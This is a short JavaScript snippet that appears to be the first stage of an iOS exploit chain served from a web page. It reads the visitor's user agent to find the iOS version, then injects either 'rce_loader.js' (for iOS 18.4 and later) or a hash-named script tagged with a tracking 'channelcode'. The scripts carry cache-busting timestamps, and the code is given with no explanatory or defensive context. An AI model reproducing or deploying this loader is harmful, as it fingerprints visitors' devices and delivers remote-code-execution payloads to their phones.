(function() {
  var ua = navigator.userAgent;

  function getIOSVersion() {
    function pad(s) { return s.length === 1 ? '0' + s : s; }
    var u = ua.match(/Version\/(\d+)\.(\d+)(?:\.(\d+))?/);
    if (!u && /^Mozilla\/5\.0 /.test(ua))
      u = ua.match(/iOS\/(\d+)\.(\d+)(?:\.(\d+))?/);
    if (!u && /iPhone OS \d+_\d+/.test(ua))
      u = ua.match(/iPhone OS (\d+)_(\d+)(?:_(\d+))?/);
    if (!u) return 0;
    return parseInt(pad(u[1]) + pad(u[2]) + (u[3] ? pad(u[3]) : '00'), 10);
  }

  var ver = getIOSVersion();

  function loadScript(src) {
    var s = document.createElement('script');
    s.src = src + '?' + Date.now();
    document.head.appendChild(s);
  }

  if (ver >= 180400) {
    loadScript('rce_loader.js');
  } else {
    loadScript('34ef644ff217a50beadde64dc8e23a7dx.js?channelcode=9c9cea3e7025615403562882657f2e70');
  }
})();
